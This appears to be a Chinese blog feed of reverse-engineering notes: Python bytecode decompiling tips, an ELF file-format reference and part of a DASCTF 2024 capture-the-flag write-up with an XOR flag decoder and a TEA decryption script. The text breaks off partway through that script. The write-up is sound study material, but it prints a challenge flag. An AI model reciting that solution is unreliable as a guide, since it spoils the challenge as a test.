        <content type="html"><![CDATA[<h2 id="Pycdc反编译器">Pycdc反编译器</h2><p><a href="https://github.com/zrax/pycdc">GitHub - zrax/pycdc: C++ python bytecode disassembler and decompiler</a></p><p>用这个可以方便地反编译高版本代码</p><h2 id="花指令或者反编译无效">花指令或者反编译无效</h2><p>取巧的一个方法就是</p><p>用dis的dis</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">r&quot;./NSSCTF.pyc&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">data = fp.read()</span><br><span class="line">Pyobj = marshal.loads(data[<span class="number">16</span>:])</span><br><span class="line">dis.dis(Pyobj)</span><br></pre></td></tr></table></figure><p>直接看字节码，然后让ai反编译</p><p>另一个方法</p><p>参考</p><p><a href="https://www.qinglite.cn/doc/27916618484af0123">技术分享 | Python逆向：修改Pycdc源码绕过花指令-轻识 (qinglite.cn)</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 语言 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> python逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELF文件结构</title>
      <link href="/posts/e60119a.html"/>
      <url>/posts/e60119a.html</url>
      
        <content type="html"><![CDATA[<hr><p>无限期停更<br><a href="https://sp4n9x.github.io/2021/05/27/ELF_FileFormat_Analysis/">ELF文件格式分析 | Sp4n9x’s Blog</a></p><p><a href="https://www.cnblogs.com/sky-heaven/p/15863815.html">手拆ELF32（一，文件头）【转】 - Sky&amp;Zhang - 博客园 (cnblogs.com)</a></p><p><a href="https://juejin.cn/post/7317577665015005223">ELF解析01 - ELF头和程序头 - 掘金 (juejin.cn)</a></p><p><a href="https://mudongliang.github.io/2015/05/19/elf-section-header-data-structure.html">ELF Section Header的结构 (mudongliang.github.io)</a></p><p>因为上面几篇讲的太详细了，后面不写了</p><p>其中第三篇为加载时需要关注的点，前两篇都是讲结构特点</p><hr><p>上次了解了windows系统上的PE文件结构，这里在网上总结了一些（抄了一些）内容</p><h2 id="序">序</h2><p>ELF分为大致分为三种：</p><ul><li>可重定位文件(relocatable)：编译器和汇编器产生的.o文件，被Linker所处理</li><li>可执行文件(executable)：Linker对.o文件进行处理输出的文件，进程映像</li><li>共享对象文件(shared object)：<a href="http://xn--5nqw3gs1n2mbb8m.so">动态库文件.so</a></li></ul><p>文件布局大致为：</p><ul><li>ELF header</li><li>program header table（描述段）</li><li>段和区</li><li>section header table（描述区）</li></ul><p>以上的布局只有ELF header在固定位置，其它的位置不定</p><h2 id="ELF-header">ELF header</h2><h3 id="e-ident">e_ident</h3><p><code>Magic Number</code>  7F 45 4C 46</p><p>EI_class：(1字节)</p><ul><li>无效类</li><li>1 32位</li><li>2 64位</li></ul><p>EI_DATA：(1字节)</p><ul><li>0 无效数据编码</li><li>1 小端序</li><li>2 大端序</li></ul><p>EI_VERSION：只有01这个值</p><p>EI_OSABI：操作系统/ABI标识</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">ELFOSABI_NONE</td><td style="text-align:center">0</td><td style="text-align:left">No extensions or unspecified</td></tr><tr><td style="text-align:left">ELFOSABI_SYSV</td><td style="text-align:center">0</td><td style="text-align:left">UNIX System V ABI</td></tr><tr><td style="text-align:left">ELFOSABI_HPUX</td><td style="text-align:center">1</td><td style="text-align:left">HP-UX ABI</td></tr><tr><td style="text-align:left">ELFOSABI_NETBSD</td><td style="text-align:center">2</td><td style="text-align:left">NetBSD ABI</td></tr><tr><td style="text-align:left">ELFOSABI_LINUX</td><td style="text-align:center">3</td><td style="text-align:left">Linux ABI</td></tr><tr><td style="text-align:left">ELFOSABI_HURD</td><td style="text-align:center">4</td><td style="text-align:left">GNU Hurd ABI</td></tr><tr><td style="text-align:left">ELFOSABI_SOLARIS</td><td style="text-align:center">6</td><td style="text-align:left">Sun Solaris ABI</td></tr><tr><td style="text-align:left">ELFOSABI_AIX</td><td style="text-align:center">7</td><td style="text-align:left">IBM AIX ABI</td></tr><tr><td style="text-align:left">ELFOSABI_IRIX</td><td style="text-align:center">8</td><td style="text-align:left">SGI Irix ABI</td></tr><tr><td style="text-align:left">ELFOSABI_FREEBSD</td><td style="text-align:center">9</td><td style="text-align:left">FreeBSD ABI</td></tr><tr><td style="text-align:left">ELFOSABI_TRU64</td><td style="text-align:center">10</td><td style="text-align:left">Compaq TRU64 UNIX ABI</td></tr><tr><td style="text-align:left">ELFOSABI_MODESTO</td><td style="text-align:center">11</td><td style="text-align:left">Novell Modesto ABI</td></tr><tr><td style="text-align:left">ELFOSABI_OPENBSD</td><td style="text-align:center">12</td><td style="text-align:left">OpenBSD ABI</td></tr><tr><td style="text-align:left">ELFOSABI_OPENVMS</td><td style="text-align:center">13</td><td style="text-align:left">OpenVMS ABI</td></tr><tr><td style="text-align:left">ELFOSABI_NSK</td><td style="text-align:center">14</td><td style="text-align:left">NonStop Kernel ABI</td></tr><tr><td style="text-align:left">ELFOSABI_AROS</td><td style="text-align:center">15</td><td style="text-align:left">AROS ABI</td></tr><tr><td style="text-align:left">ELFOSABI_FENIXOS</td><td style="text-align:center">16</td><td style="text-align:left">Fenix OS ABI</td></tr><tr><td style="text-align:left">ELFOSABI_CLOUDABI</td><td style="text-align:center">17</td><td style="text-align:left">CloudABI</td></tr><tr><td style="text-align:left">ELFOSABI_ARM_AEABI</td><td style="text-align:center">64</td><td style="text-align:left">ARM EABI</td></tr><tr><td style="text-align:left">ELFOSABI_ARM</td><td style="text-align:center">97</td><td style="text-align:left">ARM ABI</td></tr><tr><td style="text-align:left">ELFOSABI_STANDALONE</td><td style="text-align:center">255</td><td style="text-align:left">Standalone (embedded) application</td></tr></tbody></table><p>EI_ABIVERSION：</p><p>进一步指定ABI版本</p><p>elf pad：填充字节，置0</p><h3 id="E-TYPE">E_TYPE</h3><p>标明文件类型（2字节）</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">ET_NONE</td><td style="text-align:center">0</td><td style="text-align:left">无文件类型</td></tr><tr><td style="text-align:left">ET_REL</td><td style="text-align:center">1</td><td style="text-align:left">可重定位文件</td></tr><tr><td style="text-align:left">ET_EXEC</td><td style="text-align:center">2</td><td style="text-align:left">可执行文件</td></tr><tr><td style="text-align:left">ET_DYN</td><td style="text-align:center">3</td><td style="text-align:left">共享目标文件</td></tr><tr><td style="text-align:left">ET_CORE</td><td style="text-align:center">4</td><td style="text-align:left">核心转储文件</td></tr><tr><td style="text-align:left">ET_NUM</td><td style="text-align:center">5</td><td style="text-align:left">定义的文件类型数量</td></tr><tr><td style="text-align:left">ET_LOOS</td><td style="text-align:center">0xFE00</td><td style="text-align:left">特定操作系统目标文件类型值范围的下限</td></tr><tr><td style="text-align:left">ET_HIOS</td><td style="text-align:center">0xFEFF</td><td style="text-align:left">特定操作系统目标文件类型值范围的上限</td></tr><tr><td style="text-align:left">ET_LOPROC</td><td style="text-align:center">0xFF00</td><td style="text-align:left">特定处理器目标文件类型值范围的下限</td></tr><tr><td style="text-align:left">ET_HIPROC</td><td style="text-align:center">0xFFFF</td><td style="text-align:left">特定处理器目标文件类型值范围的上限</td></tr></tbody></table><h3 id="e-machine">e_machine</h3><p>标明处理器架构和指令集（2字节）</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">EM_NONE</td><td style="text-align:center">0</td><td style="text-align:left">无机器类型</td></tr><tr><td style="text-align:left">EM_M32</td><td style="text-align:center">1</td><td style="text-align:left">AT&amp;T WE 32100</td></tr><tr><td style="text-align:left">EM_SPARC</td><td style="text-align:center">2</td><td style="text-align:left">SUN SPARC</td></tr><tr><td style="text-align:left">EM_386</td><td style="text-align:center">3</td><td style="text-align:left">Intel 80386(x86)</td></tr><tr><td style="text-align:left">EM_68K</td><td style="text-align:center">4</td><td style="text-align:left">Motorola 68000(M68k)</td></tr><tr><td style="text-align:left">EM_88K</td><td style="text-align:center">5</td><td style="text-align:left">Motorola 88000(M88k)</td></tr><tr><td style="text-align:left">EM_860</td><td style="text-align:center">7</td><td style="text-align:left">Intel 80860</td></tr><tr><td style="text-align:left">EM_MIPS</td><td style="text-align:center">8</td><td style="text-align:left">MIPS R3000 big-endian</td></tr><tr><td style="text-align:left">EM_MIPS_RS3_LE</td><td style="text-align:center">10</td><td style="text-align:left">MIPS R3000 little-endian</td></tr><tr><td style="text-align:left">EM_MIPS_RS4_BE</td><td style="text-align:center">10</td><td style="text-align:left">MIPS R4000 big-endian</td></tr><tr><td style="text-align:left">EM_PPC</td><td style="text-align:center">20</td><td style="text-align:left">PowerPC</td></tr><tr><td style="text-align:left">EM_PPC64</td><td style="text-align:center">21</td><td style="text-align:left">PowerPC 64-bit</td></tr><tr><td style="text-align:left">EM_ARM</td><td style="text-align:center">40</td><td style="text-align:left">ARM 32-bit(up to ARMv7/Aarch32)</td></tr><tr><td style="text-align:left">EM_SPARCV9</td><td style="text-align:center">43</td><td style="text-align:left">SPARC v9 64-bit</td></tr><tr><td style="text-align:left">EM_IA_64</td><td style="text-align:center">50</td><td style="text-align:left">HP/Intel IA-64</td></tr><tr><td style="text-align:left">EM_X86_64</td><td style="text-align:center">62</td><td style="text-align:left">AMD x86-64</td></tr><tr><td style="text-align:left">EM_MSP430</td><td style="text-align:center">105</td><td style="text-align:left">Texas Instruments msp430</td></tr><tr><td style="text-align:left">EM_ALTERA_NIOS2</td><td style="text-align:center">113</td><td style="text-align:left">Altera Nios II</td></tr><tr><td style="text-align:left">EM_AARCH64</td><td style="text-align:center">183</td><td style="text-align:left">ARM 64-bit(ARMv8/Aarch64)</td></tr><tr><td style="text-align:left">EM_AVR32</td><td style="text-align:center">185</td><td style="text-align:left">Amtel 32-bit microprocessor</td></tr><tr><td style="text-align:left">EM_STM8</td><td style="text-align:center">186</td><td style="text-align:left">STMicroelectronics STM8</td></tr><tr><td style="text-align:left">EM_RISCV</td><td style="text-align:center">243</td><td style="text-align:left">RISC-V</td></tr><tr><td style="text-align:left">EM_BPF</td><td style="text-align:center">247</td><td style="text-align:left">Linux BPF – in-kernel virtual machine</td></tr></tbody></table><h3 id="e-version">e_version</h3><p>当前文件版本（四字节）</p><p>0 无版本</p><p>其它 当前版本号</p><h3 id="程序入口">程序入口</h3><p>8字节，标明入口点</p><h3 id="程序头表偏移">程序头表偏移</h3><p>8字节，描述段表在文件中的偏移</p><h3 id="区表偏移">区表偏移</h3><p>8字节，描述区表在文件中的偏移</p><h3 id="e-flag">e_flag</h3><p>处理器指定的与文件相关联的flag(4字节，一般是0)</p><h3 id="ELF-header-大小">ELF_header 大小</h3><p>2字节，指明头大小。一般为0x40</p><h3 id="程序头表大小">程序头表大小</h3><p>2字节，如果没有程序头表，则为0</p><h3 id="程序头内容数量">程序头内容数量</h3><p>2字节，标明程序头表中的内容个数</p><h3 id="节区头表大小">节区头表大小</h3><p>2字节，如果没有节区头表，则为0</p><h3 id="节区头内容数量">节区头内容数量</h3><p>2字节，标明节区头表中的内容个数</p><h3 id="节区头字符表索引">节区头字符表索引</h3><p>2字节，有以下可选值</p><p>/* Special section indices. */</p><p>#define SHN_UNDEF 0 /* Undefined section <em>/<br>#define SHN_LORESERVE 0xff00 /</em> Start of reserved indices <em>/<br>#define SHN_LOPROC 0xff00 /</em> Start of processor-specific <em>/<br>#define SHN_BEFORE 0xff00 /</em> Order section before all others<br>(Solaris). <em>/<br>#define SHN_AFTER 0xff01 /</em> Order section after all others<br>(Solaris). <em>/<br>#define SHN_HIPROC 0xff1f /</em> End of processor-specific <em>/<br>#define SHN_LOOS 0xff20 /</em> Start of OS-specific <em>/<br>#define SHN_HIOS 0xff3f /</em> End of OS-specific <em>/<br>#define SHN_ABS 0xfff1 /</em> Associated symbol is absolute <em>/<br>#define SHN_COMMON 0xfff2 /</em> Associated symbol is common <em>/<br>#define SHN_XINDEX 0xffff /</em> Index is in extra table. <em>/<br>#define SHN_HIRESERVE 0xffff /</em> End of reserved indices */</p><h2 id="program-header-table">program_header_table</h2><p>是一个结构体数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PN_XNUM0xffff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Wordp_type;<span class="comment">/* Segment type */</span></span><br><span class="line">    Elf32_Offp_offset;<span class="comment">/* Segment file offset */</span></span><br><span class="line">    Elf32_Addrp_vaddr;<span class="comment">/* Segment virtual address */</span></span><br><span class="line">    Elf32_Addrp_paddr;<span class="comment">/* Segment physical address */</span></span><br><span class="line">    Elf32_Wordp_filesz;<span class="comment">/* Segment size in file */</span></span><br><span class="line">    Elf32_Wordp_memsz;<span class="comment">/* Segment size in memory */</span></span><br><span class="line">    Elf32_Wordp_flags;<span class="comment">/* Segment flags */</span></span><br><span class="line">    Elf32_Wordp_align;<span class="comment">/* Segment alignment */</span></span><br><span class="line">&#125; Elf32_Phdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf64_Wordp_type;<span class="comment">/* Segment type */</span></span><br><span class="line">    Elf64_Wordp_flags;<span class="comment">/* Segment flags */</span></span><br><span class="line">    Elf64_Offp_offset;<span class="comment">/* Segment file offset */</span></span><br><span class="line">    Elf64_Addrp_vaddr;<span class="comment">/* Segment virtual address */</span></span><br><span class="line">    Elf64_Addrp_paddr;<span class="comment">/* Segment physical address */</span></span><br><span class="line">    Elf64_Xwordp_filesz;<span class="comment">/* Segment size in file */</span></span><br><span class="line">    Elf64_Xwordp_memsz;<span class="comment">/* Segment size in memory */</span></span><br><span class="line">    Elf64_Xwordp_align;<span class="comment">/* Segment alignment */</span></span><br><span class="line">&#125; Elf64_Phdr;</span><br></pre></td></tr></table></figure><h3 id="段类型">段类型</h3><p>p_type，四字节</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">PT_NULL</td><td style="text-align:center">0</td><td style="text-align:left">该数组元素未使用。除p_type外，其他结构体成员的值都是未定义的。这种类型可以使程序头表(Program Header Table)忽略此条目。</td></tr><tr><td style="text-align:left">PT_LOAD</td><td style="text-align:center">1</td><td style="text-align:left">此类型段为一个可加载的段，大小由p_filesz和p_memsz描述。文件中该段的内容被映射到相应内存段的开始处。如果p_memsz大于p_filesz，“剩余”的字节都要被置为0并跟踪段的初始化区域。p_filesz不能大于p_memsz。可加载的段在程序头表中按照p_vaddr升序排列。</td></tr><tr><td style="text-align:left">PT_DYNAMIC</td><td style="text-align:center">2</td><td style="text-align:left">此类型段给出动态链接信息，具体参见ELF手册Book III。</td></tr><tr><td style="text-align:left">PT_INTERP</td><td style="text-align:center">3</td><td style="text-align:left">此类型段给出了一个以Null结尾的字符串的位置和长度，该字符串将被当作解释器的路径名进行调用。这种段类型仅对可执行文件有意义(也可能出现在共享目标文件中)。此外，这种段在一个文件中最多出现一次。而且该段类型的数组元素存在的话，它必须在所有可加载段条目的前面。</td></tr><tr><td style="text-align:left">PT_NOTE</td><td style="text-align:center">4</td><td style="text-align:left">此类型段给出附加信息的位置和大小。</td></tr><tr><td style="text-align:left">PT_SHLIB</td><td style="text-align:center">5</td><td style="text-align:left">该段类型被保留，不过语义未指定。而且，包含这种类型数组元素的程序不符合Unix System V的ELF标准，具体参见ELF手册Book III。</td></tr><tr><td style="text-align:left">PT_PHDR</td><td style="text-align:center">6</td><td style="text-align:left">该段类型的数组元素如果存在的话，则给出了程序头表自身在文件和程序内存映像中的的位置和大小。此类型的段在文件中最多出现一次。此外，只有程序头表是程序内存映像的一部分时，该段类型的数组元素才会存在。如果该段类型的数组元素存在，则必须在所有可加载段条目的前面。</td></tr><tr><td style="text-align:left">PT_TLS</td><td style="text-align:center">7</td><td style="text-align:left">该段类型的数组元素给出线程本地存储段(TLS)的信息。</td></tr><tr><td style="text-align:left">PT_LOOS</td><td style="text-align:center">0x60000000</td><td style="text-align:left">特定操作系统段类型值的下限。</td></tr><tr><td style="text-align:left">PT_GNU_EH_FRAME</td><td style="text-align:center">0x6474E550</td><td style="text-align:left">该段类型数组元素指定异常处理信息的位置和大小(由.eh_frame_hdr节定义)[^5]。</td></tr><tr><td style="text-align:left">PT_GNU_STACK</td><td style="text-align:center">0x6474E551</td><td style="text-align:left">该段类型数组元素中的p_flags成员指定包含栈的段的权限，并用于指示栈是否应该是可执行的。没有此段类型的数组元素，则表示该栈将是可执行的[^5]。</td></tr><tr><td style="text-align:left">PT_GNU_RELRO</td><td style="text-align:center">0x6474E552</td><td style="text-align:left">该段类型数组元素指定了一个在重定位后可以被置为只读的段的位置和大小[^5]。</td></tr><tr><td style="text-align:left">PT_GNU_PROPERTY</td><td style="text-align:center">0x6474E553</td><td style="text-align:left">该段类型数组元素指定.note.gnu.property节的位置和大小。</td></tr><tr><td style="text-align:left">PT_HIOS</td><td style="text-align:center">0x6FFFFFFF</td><td style="text-align:left">特定操作系统段类型值的上限。</td></tr><tr><td style="text-align:left">PT_LOPROC</td><td style="text-align:center">0x70000000</td><td style="text-align:left">特定处理器段类型值的下限。</td></tr><tr><td style="text-align:left">PT_HIPROC</td><td style="text-align:center">0x7FFFFFFF</td><td style="text-align:left">特定处理器段类型值的上限。</td></tr></tbody></table><h3 id="段权限">段权限</h3><p>p_flags，四字节</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">PF_X</td><td style="text-align:center">0x1</td><td style="text-align:left">段具有可执行权限</td></tr><tr><td style="text-align:left">PF_W</td><td style="text-align:center">0x2</td><td style="text-align:left">段具有写权限</td></tr><tr><td style="text-align:left">PF_R</td><td style="text-align:center">0x4</td><td style="text-align:left">段具有读权限</td></tr><tr><td style="text-align:left">PF_MASKOS</td><td style="text-align:center">0x0FF00000</td><td style="text-align:left">为特定操作系统预留</td></tr><tr><td style="text-align:left">PF_MASKPROC</td><td style="text-align:center">0xF0000000</td><td style="text-align:left">为特定处理器预留</td></tr></tbody></table><p>如果是0，表明拒绝访问<br>以上权限可组合，且一般情况，段没有写权限</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">准确的权限</th><th style="text-align:left">允许的权限</th></tr></thead><tbody><tr><td style="text-align:left">none</td><td style="text-align:center">0</td><td style="text-align:left">拒绝所有访问</td><td style="text-align:left">拒绝所有访问</td></tr><tr><td style="text-align:left">PF_X</td><td style="text-align:center">1</td><td style="text-align:left">只执行</td><td style="text-align:left">读，执行</td></tr><tr><td style="text-align:left">PF_W</td><td style="text-align:center">2</td><td style="text-align:left">只写</td><td style="text-align:left">读，写，执行</td></tr><tr><td style="text-align:left">PF_W + PF_X</td><td style="text-align:center">3</td><td style="text-align:left">写，执行</td><td style="text-align:left">读，写，执行</td></tr><tr><td style="text-align:left">PF_R</td><td style="text-align:center">4</td><td style="text-align:left">只读</td><td style="text-align:left">读，执行</td></tr><tr><td style="text-align:left">PF_R + PF_X</td><td style="text-align:center">5</td><td style="text-align:left">读，执行</td><td style="text-align:left">读，执行</td></tr><tr><td style="text-align:left">PF_R + PF_W</td><td style="text-align:center">6</td><td style="text-align:left">读，写</td><td style="text-align:left">读，写，执行</td></tr><tr><td style="text-align:left">PF_R + PF_W + PF_X</td><td style="text-align:center">7</td><td style="text-align:left">读，写，执行</td><td style="text-align:left">读，写，执行</td></tr></tbody></table><h3 id="段内容">段内容</h3><p>Segment Contents标明了一个段的多种节的类型</p><h3 id="段偏移">段偏移</h3><p>在文件中的偏移，8字节</p><h3 id="段虚拟地址">段虚拟地址</h3><p>表示加载后的相对偏移。真实地址=虚拟地址基址+段虚拟地址，8字节</p><h3 id="段物理地址">段物理地址</h3><p>不知道作用，可能是在虚拟内存中的地址。8字节</p><h3 id="段文件长度">段文件长度</h3><p>段在文件中的长度，8字节</p><h3 id="段虚拟长度">段虚拟长度</h3><p>段在内存中的长度，8字节</p><h3 id="段对齐方式">段对齐方式</h3><p>8字节，一般为4096</p><hr><p>参考：</p><p><a href="https://docs.oracle.com/cd/E26926_01/html/E25910/chapter6-35342.html">ELF 标识 - 链接程序和库指南 (oracle.com)</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PE文件结构 </tag>
            
            <tag> ELF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2024summer-RE</title>
      <link href="/posts/b7df16dd.html"/>
      <url>/posts/b7df16dd.html</url>
      
        <content type="html"><![CDATA[<p>第一次遇到DCT，QAQ，终究还是被暴打了</p><h2 id="DosSnake">DosSnake</h2><p>考察16位汇编，大概打开看看，是一个贪吃蛇，按照游戏题的惯例，应当是胜利后自动输出flag</p><p>看一下有没有相关函数或者字符串</p><p>查字符串可以看到有DASCTF，然后交叉引用</p><p>大概是这样：</p><p><img src="https://s2.loli.net/2024/07/21/FtOvZPhXBp6o82c.png" alt="image-20240721174647593"></p><p>可以看到用（di）dasctf和（si）后面的位数依次异或，一轮后重置di</p><p>直接写脚本</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from prism import *</span><br><span class="line">a = [<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3F</span>, <span class="number">0x09</span>, <span class="number">0x63</span>, <span class="number">0x34</span>, <span class="number">0x32</span>, <span class="number">0x13</span>, <span class="number">0x2A</span>, <span class="number">0x2F</span>, <span class="number">0x2A</span>, <span class="number">0x37</span>, <span class="number">0x3C</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x2E</span>, <span class="number">0x20</span>, <span class="number">0x10</span>, <span class="number">0x3A</span>, <span class="number">0x27</span>, <span class="number">0x2F</span>, <span class="number">0x24</span>, <span class="number">0x3A</span>, <span class="number">0x30</span>, <span class="number">0x75</span>, <span class="number">0x67</span>, <span class="number">0x65</span>, <span class="number">0x3C</span>]</span><br><span class="line">c = [<span class="number">0x44</span>, <span class="number">0x41</span>, <span class="number">0x53</span>, <span class="number">0x43</span>, <span class="number">0x54</span>, <span class="number">0x46</span>]</span><br><span class="line"><span class="keyword">pxor</span>(a,c)</span><br><span class="line"># DASCTF&#123;H0wfUnnytheDosSnakeis!!!&#125;</span><br></pre></td></tr></table></figure><h2 id="Strangeprograme">Strangeprograme</h2><p>常规TEA，不多说</p><p>反调，附加调试进入主要判断逻辑</p><p>加密是一样的，区别是只加密第一组数据，然后异或后面的数据</p><p>直接写脚本解</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">enc</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* a1, <span class="type">unsigned</span> <span class="type">int</span>* a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+DCh] [ebp-2Ch]</span></span><br><span class="line"><span class="type">int</span> v3; <span class="comment">// [esp+E8h] [ebp-20h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+F4h] [ebp-14h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+100h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//sub_4114D8(&amp;unk_4250F3);</span></span><br><span class="line">v5 = *a1;</span><br><span class="line">v4 = a1[<span class="number">1</span>];</span><br><span class="line">v3 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">v5 += (a2[<span class="number">1</span>] + (v4 &gt;&gt; <span class="number">5</span>)) ^ (v3 + v4) ^ (*a2 + <span class="number">16</span> * v4);</span><br><span class="line">v4 += (a2[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (v3 + v5) ^ (a2[<span class="number">2</span>] + <span class="number">16</span> * v5);</span><br><span class="line">v3 -= <span class="number">0x61C88647</span>;</span><br><span class="line">&#125;</span><br><span class="line">*a1 = v5;</span><br><span class="line">a1[<span class="number">1</span>] = v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">dec</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* a1, <span class="type">unsigned</span> <span class="type">int</span>* a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+DCh] [ebp-2Ch]</span></span><br><span class="line"><span class="type">int</span> sum; <span class="comment">// [esp+E8h] [ebp-20h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+F4h] [ebp-14h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+100h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//sub_4114D8(&amp;unk_4250F3);</span></span><br><span class="line">v5 = *a1;</span><br><span class="line">v4 = a1[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">sum -= <span class="number">0x61C88647</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">sum += <span class="number">0x61C88647</span>;</span><br><span class="line">v4 -= (a2[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (sum + v5) ^ (a2[<span class="number">2</span>] + <span class="number">16</span> * v5);</span><br><span class="line">v5 -= (a2[<span class="number">1</span>] + (v4 &gt;&gt; <span class="number">5</span>)) ^ (sum + v4) ^ (*a2 + <span class="number">16</span> * v4);</span><br><span class="line">&#125;</span><br><span class="line">*a1 = v5;</span><br><span class="line">a1[<span class="number">1</span>] = v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span 